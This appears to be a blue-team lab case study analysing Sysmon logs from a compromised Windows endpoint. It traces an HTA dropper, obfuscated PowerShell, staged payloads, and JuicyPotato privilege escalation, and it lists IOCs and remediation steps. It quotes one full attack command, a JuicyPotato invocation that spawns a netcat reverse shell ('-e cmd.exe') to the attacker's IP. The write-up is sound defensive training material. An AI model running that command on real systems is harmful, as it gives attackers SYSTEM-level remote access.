# Case Study 4 - Multi-Stage Malware Intrusion Investigation Using Sysmon Logs

**Analyst:** Idris Ibrahim Adetola  
**Date:** 11-02-2026  
**Data Source:** BTLO Labs

---

## Objective

Analyze a JSON Sysmon log file from a compromised endpoint — without the use of a SIEM — to identify the steps and techniques used by the attacker.

---

## Incident Classification

| Field | Detail |
|---|---|
| **Incident Type** | Multi-Stage Malware Infection |
| **Severity Level** | High |
| **Impact** | System-Level Privilege Escalation Achieved |

---

## Tools and Data Sources

| Tool | Purpose |
|---|---|
| **Notepad++** | Text and source code editor |
| **BTLO (Blue Team Lab Online)** | Data source |
| **VirusTotal** | Threat intelligence |

---

## Investigation Overview

The analyzed log contains Windows Sysmon events of a compromised endpoint. Observed event IDs:

- **Event ID 1** — Process creations
- **Event ID 3** — Network connections
- **Event ID 11** — File creation
- Command-line and PowerShell executions

---

## Investigation Methodology

### 1. Event Identification

Primary events filtered as a baseline: Event ID 1, 3, 11, 15.

### 2. Process Creation Events Analysis

Process creation events were filtered to detect suspicious executions and malicious parent-child process relationships. `ProcessGuid` and `ParentProcessGuid` were used to reconstruct the execution chain.

### 3. File Creation and Network Connection Review

Suspicious file downloads and external IP communications were detected.

### 4. Threat Intelligence Enrichment

File hashes and IP addresses were enriched with open-source threat intelligence. Several indicators confirmed malicious.

---

## Attack Timeline

| Time (UTC) | Event |
|---|---|
| 12:20:23 | `Updater.hta` downloaded from Chrome browser |
| 12:20:26 | `mshta.exe` executed malicious HTA |
| 12:20:29 | Obfuscated PowerShell executed |
| 12:20:32 | Reverse shell established (Port 1234) |
| 12:21:32 | `Supply.exe` downloaded |
| 12:21:43 | Environment `COMSPEC` modified to `Supply.exe` |
| 12:22:41 | `ftp.exe` executed `Supply.exe` |
| 12:28:57 | `JuicyPotato.exe` downloaded |
| 12:31:24 | `JuicyPotato.exe` executed |
| 12:31:24 | SYSTEM reverse shell established |

---

## Technical Findings

### 1. Initial Access
- A malicious HTA file was downloaded from the Chrome browser.
- `mshta.exe` executed the HTA file, launching the attack.

### 2. Execution and Defence Evasion
- The execution triggered an obfuscated PowerShell script block to evade detection.
- The PowerShell process initiated an outbound connection on port 1234 (reverse shell).

### 3. Payload Delivery (Stage 2)
- The attacker executed `Invoke-WebRequest` to download `supply.exe`.
- An outbound connection to the same IP on port 6969 was subsequently observed.

### 4. Environment Manipulation and Execution
- FTP (LOLBIN) was used to modify the `COMSPEC` environment variable, pointing it to `supply.exe`.
- FTP then executed `supply.exe`.

### 5. Payload Installation and Host Reconnaissance
- `supply.exe` created multiple dependency DLL files, including Python 2.7 components.
- Reconnaissance commands executed: `ipconfig`, `whoami`.

### 6. Command-and-Control Activity
- Multiple outbound connections to the attacker IP on port 8080 were observed.
- Additional obfuscated PowerShell executions occurred.

### 7. Payload Delivery (Stage 3)
- `supply.exe` used PowerShell to download `JuicyPotato.exe`.

### 8. Privilege Escalation

`JuicyPotato.exe` executed the following command:

```
juicy.exe -l 9999 -p nc.exe -a "192.168.1.11 9898 -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
```

This command:
- Created a fake COM service on port 9999.
- Used a legitimate CLSID token to trick high-privilege services.
- Captured a high-privilege SYSTEM token.
- Launched a high-privilege reverse shell via Netcat.

---

## Indicators of Compromise (IOCs)

| IOC Type | Indicator | Context |
|---|---|---|
| File Name | `Updater.HTA` | Initial infection vector |
| File Name | `Supply.exe` | Stage 2 payload |
| File Name | `JuicyPotato.exe` | Privilege escalation exploit |
| IP Address | `192.168.1.11` | Command and Control server |
| Port | 1234, 6969, 8080 | Reverse shell / C2 communication |

---

## Recommendations and Remediation Actions

- Isolate the compromised host from the network.
- Terminate all malicious processes: `mshta.exe`, suspicious PowerShell instances, `supply.exe`, `juicypotato.exe`.
- Block attacker IP addresses and associated ports at the firewall and EDR.
- Escalate incident to Tier 2 SOC.

---

## Conclusion

The investigation determined that the incident involved a multi-staged attack leveraging native Windows utilities, staged payload delivery, C2 communication, and privilege escalation. The attacker achieved **SYSTEM-level access**, significantly increasing the risk of lateral movement, data exfiltration, and full environment compromise.